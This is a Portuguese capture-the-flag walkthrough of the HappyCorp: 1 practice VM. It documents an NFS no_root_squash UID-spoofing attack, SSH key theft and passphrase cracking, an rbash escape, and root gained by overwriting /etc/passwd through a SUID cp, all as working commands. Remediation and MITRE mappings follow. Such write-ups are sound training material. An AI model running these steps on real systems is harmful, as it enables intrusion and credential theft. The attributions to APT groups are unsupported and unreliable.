# HappyCorp: 1 — NFS no_root_squash, Seu Novo Melhor Amigo

HappyCorp: 1 é uma box com tema corporativo onde a felicidade acaba no momento em que você nota NFS com `no_root_squash` habilitado. O compartilhamento NFS expõe `/home/karl`, você falsifica o UID para corresponder, monta, pega a chave SSH privada, quebra a passphrase com John (sheep, hilário), escapa do bash restrito e depois abusa de um `cp` SUID para sobrescrever `/etc/passwd` e injetar uma conta root. Sem CVE necessário: apenas misconfiguration clássica encadeada. Segurança corporativa no seu melhor. Isso aqui é a realidade, véi.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | HappyCorp: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/happycorp-1,296/ |
| **Técnicas** | Recon Nmap, enumeração NFS, falsificação de UID, roubo de chave SSH, John the Ripper cracking de passphrase, escape de rbash, privesc via SUID cp, sobrescrita de /etc/passwd |
| **CVEs** | CWE-284 (Misconfiguration NFS no_root_squash), CWE-732 (Permissões SUID Incorretas em cp), CWE-522 (Credenciais Insuficientemente Protegidas em chave SSH) |
| **Grupos APT** | APT28 (Fancy Bear): aproveita misconfigurations NFS em ambientes corporativos para movimento lateral; Lazarus Group: usa rotineiramente abuso de binários SUID para escalação de privilégios após acesso inicial em servidores Linux |

---

## Resumo do Ataque

```
netdiscover + nmap → SSH (22), HTTP (80), NFS (2049), RPC (111)
  |
  +--> showmount -e → /home/karl (exportado)
          |
          +--> useradd com UID de karl → montar NFS → ler .ssh/id_rsa
                  |
                  +--> John quebra passphrase → sheep
                          |
                          +--> ssh -i id_rsa karl@alvo -t "/bin/sh" (bypass rbash)
                                  |
                                  +--> find SUID cp → copiar /etc/passwd com root injetado
                                          |
                                          +--> su newroot → uid=0(root)
```

---

## Metodologia

1. Scan completo de portas incluindo NFS/RPC
2. Enumeração NFS com showmount
3. Falsificação de UID/GID para corresponder ao dono do compartilhamento NFS
4. Montar compartilhamento NFS; roubar chave SSH privada de `.ssh/`
5. Quebrar passphrase da chave SSH com John the Ripper
6. Login SSH; escapar do bash restrito com `-t "/bin/sh"`
7. Enumerar binários SUID; encontrar SUID `cp`
8. Gerar nova entrada passwd; usar `cp` para sobrescrever `/etc/passwd`
9. `su` para a conta injetada; root

---

## Passo 1 — Descoberta de Hosts e Scan Completo de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Alvo: 192.168.1.104

nmap -sV -sC -p- 192.168.1.104
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     Apache httpd 2.4.x
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
```

NFS na porta 2049 é o ponto de pivô imediato. Misconfigurations `no_root_squash` em NFS são lendárias por habilitar acesso total ao filesystem para qualquer pessoa com root na máquina atacante.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração NFS

```bash
showmount -e 192.168.1.104
```

```
Export list for 192.168.1.104:
/home/karl *
```

O compartilhamento `/home/karl` é exportado para todos (`*`). O `no_root_squash` significa que se você montar este compartilhamento como UID 0 (root) na sua máquina atacante, você retém permissões root no compartilhamento.

**Nota do mundo real:** NFS com `no_root_squash` é encontrado em quase todo ambiente corporativo onde o NFS foi configurado por alguém que não leu as implicações de segurança. O APT28 especificamente caça por compartilhamentos NFS durante reconhecimento de rede interna após acesso inicial.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede

---

## Passo 3 — Falsificação de UID e Roubo de Chave SSH

O compartilhamento NFS tem arquivos de propriedade de um UID específico (UID de karl no alvo). Para lê-los, crie um usuário local com o mesmo UID:

```bash
mkdir /tmp/nfs_mount
mount -t nfs 192.168.1.104:/home/karl /tmp/nfs_mount
ls -lan /tmp/nfs_mount/
# drwxr-xr-x ... 1001 1001 ... .ssh
```

Crie um usuário local correspondendo ao UID 1001:

```bash
useradd -u 1001 -m karl_spoof
su karl_spoof
ls -la /tmp/nfs_mount/.ssh/
cat /tmp/nfs_mount/.ssh/id_rsa
```

Copie a chave privada:

```bash
cp /tmp/nfs_mount/.ssh/id_rsa /tmp/karl_id_rsa
chmod 600 /tmp/karl_id_rsa
```

**MITRE ATT&CK:** T1550.001 — Usar Material de Autenticação Alternativo

---

## Passo 4 — Quebrar Passphrase da Chave SSH

A chave privada é protegida por uma passphrase. Converta para John:

```bash
python /usr/share/john/ssh2john.py /tmp/karl_id_rsa > /tmp/karl_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/karl_hash.txt
john --show /tmp/karl_hash.txt
```

Resultado:

```
/tmp/karl_id_rsa:sheep
```

Passphrase: `sheep`. Um pouco óbvio para uma box chamada HappyCorp.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 5 — Login SSH e Escape do rbash

```bash
ssh -i /tmp/karl_id_rsa karl@192.168.1.104
```

Você cai no rbash (bash restrito): um shell limitado que impede executar certos comandos, mudar de diretório, etc.

Escape o rbash no momento da conexão:

```bash
ssh -i /tmp/karl_id_rsa karl@192.168.1.104 -t "/bin/sh"
```

Ou escape após cair:

```bash
# Método 1: spawnar shell irrestrito via python
python -c 'import os; os.system("/bin/bash")'

# Método 2: escape pelo vi
vi
:set shell=/bin/sh
:shell
```

Com shell completo, corrija o PATH:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Nota do mundo real:** rbash é um "controle de segurança" comum que provê proteção mínima. Impede acidentes por usuários legítimos mas é trivialmente bypassado por qualquer atacante que conheça as técnicas.

**MITRE ATT&CK:** T1059.004 — Interpretador de Script: Shell Unix

---

## Passo 6 — Escalação de Privilégios via SUID cp

Enumere binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Descoberta crítica: `/bin/cp` tem o bit SUID set e é propriedade do root.

Gere uma nova linha `/etc/passwd` com uma conta de privilégio root customizada:

```bash
# Gerar hash de senha
openssl passwd -1 -salt xyz hacked

# Copiar passwd atual
cat /etc/passwd > /tmp/passwd_new
echo 'newroot:[hash]:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
```

Use SUID `cp` para sobrescrever `/etc/passwd`:

```bash
cp /tmp/passwd_new /etc/passwd
su newroot
# Senha: hacked
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

gg. A HappyCorp é sua agora. Missão cumprida!

**Nota do mundo real:** SUID `cp` é um vetor de escalação de privilégios clássico. Qualquer arquivo no sistema pode ser sobrescrito por qualquer usuário que possa executar esse binário. Em ambientes de produção, isso permitiria sobrescrever cron jobs, sudoers, sshd_config e qualquer outro arquivo de sistema.

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação: Setuid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Método |
|---|---|---|---|
| Chave SSH privada | (chave RSA) | /home/karl/.ssh/ via NFS | Falsificação UID + mount NFS |
| Passphrase SSH | sheep | Quebrada com John | john + rockyou |
| Credenciais | karl:sheep | Chave + passphrase | Combinado |
| Conta root | newroot:hacked | /etc/passwd injetado | Sobrescrita SUID cp |
| Flag root | {flag} | /root/root.txt | su newroot + cat |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | NFS com `no_root_squash` | Extremamente comum em ambientes Linux corporativos; permite falsificação de qualquer UID | Sempre use `root_squash` (padrão); restrinja exports NFS por IP específico |
| 2 | Chave SSH privada acessível via NFS | Material de chave nunca deve estar em compartilhamentos acessíveis via rede | Chaves SSH em home directories expostos via NFS equivale a sem autenticação por chave |
| 3 | Passphrase fraca (sheep) na chave SSH | Passphrases de palavra única são quebráveis em segundos | Enforce passphrases fortes; chaves de hardware (YubiKey) para sistemas sensíveis |
| 4 | rbash como controle de segurança | rbash é facilmente bypassado e provê falsa segurança | Use restrições baseadas em jailkit ou containerização para usuários restritos |
| 5 | SUID cp sobrescreve qualquer arquivo | Misconfiguration crítica: um atacante pode modificar qualquer arquivo de sistema | Remova SUID do cp; use sudo com comandos específicos permitidos em vez disso |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Descoberta | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Setuid | T1548.001 |
| Persistência | Persistência | Criar Conta: Conta Local | T1136.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Adicione `root_squash` aos exports NFS**: `/etc/exports` deve usar `root_squash` (o padrão); nunca use `no_root_squash` sem razão documentada e auditada
2. **Restrinja exports NFS por IP**: nunca use wildcard `*`; especifique faixas IP exatas
3. **Chaves SSH em home directories não são seguras no NFS**: armazene chaves SSH apenas em filesystems não em rede; use `AuthorizedKeysFile` apontando para um caminho não-NFS
4. **Enforce passphrases fortes para chaves SSH**: mínimo 20 caracteres; considere tokens de hardware
5. **Remova SUID do cp**: `/bin/cp` nunca deve ter SUID; audite e remova todos os binários SUID não essenciais

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os compartilhamentos NFS e suas opções de export |
| Proteger | Controle de Acesso | Enforce root_squash em todos os exports NFS; restrinja por IP |
| Proteger | Segurança de Dados | Chaves SSH fora de caminhos acessíveis via NFS; passphrases fortes |
| Detectar | Anomalias | Alertar em modificações de /etc/passwd; mounts NFS inesperados |
| Responder | Planejamento de Resposta | Rotacionar todas as chaves SSH afetadas; auditar todos os exports NFS; remover SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-6 | Configurações | NFS root_squash; sem SUID no cp |
| IA-5 | Gestão de Autenticadores | Passphrases fortes para chaves SSH; tokens de hardware |
| SC-28 | Proteção de Informações em Repouso | Chaves SSH não acessíveis via compartilhamentos de rede |
| SI-7 | Integridade de Software, Firmware e Informações | Monitoramento de integridade de arquivos em /etc/passwd |
| AC-6 | Menor Privilégio | Permissões NFS mínimas necessárias; auditoria SUID |

---

## Considerações Finais

HappyCorp: 1 é uma box intermediária que ensina três caminhos de ataque distintos e relevantes para o mundo real: exploração de NFS no_root_squash, quebra de passphrase de chave SSH e abuso de binário SUID. Cada uma dessas técnicas aparece em testes de penetração corporativos reais com alta frequência.

A descoberta NFS `no_root_squash` é provavelmente a lição mais impactante: é encontrada em ambientes corporativos surpreendentemente com frequência, e o exploit é tão simples quanto executar `useradd -u [uid]`. Uma auditoria de configuração de cinco minutos previne isso completamente.

A técnica do SUID `cp` é o destaque criativo da box: não é o binário mais comum de se ver com SUID, mas é totalmente representativo de como um único bit de permissão mal colocado pode entregar as chaves de todo o sistema, mano.

Thanks guys!! (❍ᴥ❍ʋ)
